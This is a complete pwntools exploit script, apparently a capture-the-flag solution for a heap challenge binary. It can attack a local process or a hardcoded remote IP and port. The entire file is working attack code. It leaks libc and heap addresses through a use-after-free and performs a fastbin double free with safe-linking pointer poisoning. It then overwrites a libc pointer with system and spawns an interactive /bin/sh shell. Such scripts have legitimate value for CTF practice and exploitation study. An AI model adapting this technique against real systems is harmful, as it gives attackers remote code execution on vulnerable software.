#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("heapchall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")


# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

rop = ROP(exe)

host, port = "34.90.214.14", "1337"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

def alloc(idx,size):
  sla('Option: ', '1')
  sla('Slot: ', str(idx))
  sla('Size: ', str(size))

def edit(idx,data):
  sla('Option: ', '2')
  sla('Slot: ', str(idx))
  sla('content: ', data)

def free(idx):
  sla('Option: ', '3')
  sla('Slot: ', str(idx))

def view(idx):
  sla('Option: ', '4')
  sla('Slot: ', str(idx))

alloc(0,0x500)
alloc(1,0x50)
free(0)
view(0)
libc.address = u64(p.recvuntil('\n',drop=True).ljust(8,b'\x00')) - 0x219ce0
logbase()

for i in range(10):
  alloc(i,0x10)

for i in range(7):
  free(i)

view(0)
heap = u64(p.recvuntil('\n',drop=True).ljust(8,b'\x00'))
logleak('heap',heap)

# double free in fastbins
free(8)
free(9)
free(8)

for i in range(7):
  alloc(0,0x10)

alloc(1,0x10)
edit(1,p64((libc.address+0x219090)^heap))
alloc(2,0x10)
edit(2,'/bin/sh\x00')
alloc(3,0x10)
alloc(4,0x10)
edit(4,p64(libc.sym['system'])*2)
view(2)

p.interactive()

